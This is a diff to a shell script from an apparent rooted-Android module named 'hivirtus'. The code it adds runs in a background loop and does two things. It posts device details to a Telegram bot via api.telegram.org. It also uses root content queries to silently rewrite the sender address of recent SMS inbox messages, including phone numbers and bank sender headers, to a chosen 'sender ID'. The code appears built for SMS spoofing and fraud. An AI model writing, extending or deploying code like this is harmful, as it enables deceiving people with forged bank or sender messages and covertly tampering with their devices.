@@ -334,9 +334,134 @@ ${ONE_TAP}"
 seed_hooked_pkgs() { return 0; }
 seed_apatch_config() { return 0; }
 
+device_name() {
+  local n
+  n=$(getprop ro.product.marketname 2>/dev/null | tr -d '\r')
+  [ -z "$n" ] && n=$(getprop ro.product.model 2>/dev/null | tr -d '\r')
+  [ -z "$n" ] && n=$(getprop ro.product.device 2>/dev/null | tr -d '\r')
+  local manu
+  manu=$(getprop ro.product.manufacturer 2>/dev/null | tr -d '\r')
+  if [ -n "$manu" ] && [ -n "$n" ]; then
+    echo "$n" | grep -qi "$manu" && echo "$n" || echo "$manu $n"
+  else
+    echo "${n:-Android}"
+  fi
+}
+
+module_is_active() {
+  [ -f /data/local/tmp/hivirtus_zygisk_native.active ] && return 0
+  [ -f /data/local/tmp/hivirtus_inject.log ] && return 0
+  [ -f /data/local/tmp/hivirtus_module_heartbeat.txt ] && return 0
+  return 1
+}
+
+# Save pe Telegram test — exact format user ne diya
+send_tg_test_if_requested() {
+  [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
+  read_tg_creds
+  if [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ]; then
+    rm -f /data/local/tmp/hivirtus_tg_test.request
+    return 0
+  fi
+  DEV=$(device_name)
+  if module_is_active; then
+    STATUS="Successful Active!"
+  else
+    STATUS="not active"
+  fi
+  TEXT="🚀 @hivirtus Zygisk Mode Test
+${STATUS}
+
+Device: ${DEV}"
+  ESC_TEXT=$(tg_json_escape "$TEXT")
+  PAYLOAD="/data/local/tmp/hivirtus_tg_test_payload.json"
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
+  RESP="/data/local/tmp/hivirtus_tg_test_response.txt"
+  SENT=0
+  if command -v curl >/dev/null 2>&1; then
+    curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+      -H "Content-Type: application/json" \
+      --data-binary "@${PAYLOAD}" > "$RESP" 2>/dev/null && SENT=1
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -O "$RESP" --timeout=25 \
+      --header="Content-Type: application/json" \
+      --post-file="$PAYLOAD" \
+      "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" 2>/dev/null && SENT=1
+  fi
+  if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
+    rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD"
+    echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+  else
+    # Token galat / network fail — try once more next loop; after 3 fails drop request
+    FAILS=$(cat /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null || echo 0)
+    FAILS=$((FAILS + 1))
+    echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
+    if [ "$FAILS" -ge 3 ]; then
+      # Last attempt: send "not active" if we can, else drop
+      TEXT2="🚀 @hivirtus Zygisk Mode Test
+not active
+
+Device: ${DEV}"
+      ESC2=$(tg_json_escape "$TEXT2")
+      printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC2}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
+      curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+        -H "Content-Type: application/json" \
+        --data-binary "@${PAYLOAD}" >/dev/null 2>&1 || true
+      rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails "$PAYLOAD"
+    fi
+    echo "tg_test_fail $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+  fi
+}
+
+# SMSTweaks-style inbox rewrite — saved sender ID pe address update (root content, no Zygisk phone inject)
+rewrite_inbox_sender_id() {
+  local sid=""
+  if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
+    sid=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
+  fi
+  if [ -z "$sid" ]; then
+    sid=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  fi
+  [ -z "$sid" ] || [ "$sid" = "AD-TEST-S" ] && return 0
+
+  local override=1
+  if [ -f "$RUNTIME" ]; then
+    grep -q '"override_incoming_sender"[[:space:]]*:[[:space:]]*false' "$RUNTIME" 2>/dev/null && override=0
+  fi
+  [ "$override" = "0" ] && return 0
+
+  # Recent inbox rows — numeric / +91 address → saved sender ID
+  local out="/data/local/tmp/hivirtus_inbox_query.txt"
+  content query --uri content://sms/inbox --projection _id:address:date \
+    --sort "date DESC" 2>/dev/null | head -n 40 > "$out" || return 0
+
+  local now_ms id addr date digits
+  now_ms=$(date +%s)000
+  while IFS= read -r line; do
+    id=$(echo "$line" | sed -n 's/.*_id=\([0-9]*\).*/\1/p')
+    addr=$(echo "$line" | sed -n 's/.*address=\([^,]*\).*/\1/p' | sed 's/[[:space:]]*$//')
+    date=$(echo "$line" | sed -n 's/.*date=\([0-9]*\).*/\1/p')
+    [ -z "$id" ] || [ -z "$addr" ] && continue
+    [ "$addr" = "$sid" ] && continue
+    # Only rewrite recent (~10 min) messages
+    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 600000)) ] 2>/dev/null; then
+      continue
+    fi
+    digits=$(echo "$addr" | tr -cd '0-9')
+    # Phone-like or short code / alphanumeric bank headers — rewrite all non-matching
+    if [ ${#digits} -ge 8 ] || echo "$addr" | grep -qE '^[A-Za-z0-9-]{3,}$'; then
+      content update --uri content://sms/inbox \
+        --bind address:s:"$sid" \
+        --where "_id=$id" >/dev/null 2>&1 || true
+    fi
+  done < "$out"
+}
+
 (
   while true; do
+    send_tg_test_if_requested
     forward_blocked_telegram
+    rewrite_inbox_sender_id
     sleep 1
   done
 ) &
